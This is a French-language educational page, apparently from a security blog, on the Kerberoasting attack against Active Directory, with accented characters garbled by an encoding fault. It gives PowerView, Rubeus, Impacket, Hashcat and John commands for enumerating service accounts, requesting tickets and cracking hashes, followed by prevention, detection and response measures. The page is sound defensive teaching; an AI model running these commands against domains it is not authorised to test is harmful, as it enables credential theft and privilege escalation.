---
title: Kerberoasting
date: "2025-07-14"
draft: false
---

# üî• Kerberoasting

## Qu'est-ce que le Kerberoasting ?

Le **Kerberoasting** est une technique d'attaque Active Directory qui consiste √† demander des tickets de service Kerberos (TGS) pour des comptes de service, puis √† tenter de casser le hash du mot de passe hors-ligne. Cette attaque permet √† un attaquant ayant un acc√®s authentifi√© au domaine d'obtenir des mots de passe de comptes √† privil√®ges.

## üéØ Objectif de l'attaque

L'objectif principal est d'extraire des hashes de mots de passe de comptes de service (Service Accounts) qui utilisent souvent des mots de passe faibles ou r√©utilis√©s, permettant ainsi une √©l√©vation de privil√®ges dans l'environnement Active Directory.

## üìã √âtapes de l'attaque

### 1. √ânum√©ration des comptes de service

Identifier les comptes de service disposant d'un SPN (Service Principal Name) :

```powershell
# Avec PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Avec AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### 2. Demande de tickets TGS

Demander des tickets Kerberos pour les comptes de service identifi√©s :

```powershell
# Avec Rubeus
Rubeus.exe kerberoast /user:serviceaccount /outfile:hashes.txt

# Avec Impacket
python3 GetUserSPNs.py -request domain.local/user:password
```

### 3. Extraction des hashes

Extraire les hashes des tickets obtenus pour analyse hors-ligne.

### 4. Craquage des hashes

Utiliser des outils comme Hashcat ou John the Ripper pour casser les mots de passe :

```bash
# Avec Hashcat
hashcat -m 13100 -a 0 hash.txt wordlist.txt

# Avec John the Ripper
john --wordlist=wordlist.txt hash.txt
```

## üõ°Ô∏è Contre-mesures

### Pr√©vention

- **Mots de passe forts** : Utiliser des mots de passe complexes et uniques pour tous les comptes de service
- **Rotation r√©guli√®re** : Impl√©menter une politique de rotation des mots de passe
- **Principe du moindre privil√®ge** : Limiter les droits des comptes de service au strict n√©cessaire
- **Groupes de s√©curit√©** : Utiliser des groupes d√©di√©s pour les comptes de service

### D√©tection

- **Surveillance des requ√™tes TGS** : Monitorer les demandes de tickets inhabituelles
- **Logs d'audit** : Activer l'audit d√©taill√© des √©v√©nements Kerberos
- **Alertes SIEM** : Configurer des alertes pour les patterns suspects
- **Analyse comportementale** : D√©tecter les activit√©s anormales des comptes de service

### R√©ponse

- **Isolation imm√©diate** : Isoler les comptes compromis
- **Changement de mots de passe** : Forcer le changement de tous les mots de passe concern√©s
- **Analyse forensique** : Investiguer l'√©tendue de la compromission
- **Documentation** : Documenter l'incident et les le√ßons apprises

## üîß Outils populaires

| Outil               | Description                             | Plateforme       |
| ------------------- | --------------------------------------- | ---------------- |
| **Rubeus**          | Outil C# pour l'exploitation Kerberos   | Windows          |
| **Impacket**        | Collection d'outils Python              | Multi-plateforme |
| **PowerView**       | Module PowerShell pour l'√©num√©ration AD | Windows          |
| **Hashcat**         | Craqueur de hashes haute performance    | Multi-plateforme |
| **John the Ripper** | Craqueur de mots de passe classique     | Multi-plateforme |

## üìö Ressources suppl√©mentaires

- [Guide complet sur HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting)
- [Documentation Microsoft sur Kerberos](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [OWASP Active Directory Security](https://owasp.org/www-project-active-directory-security/)

---

_Derni√®re mise √† jour : 14 juillet 2025_
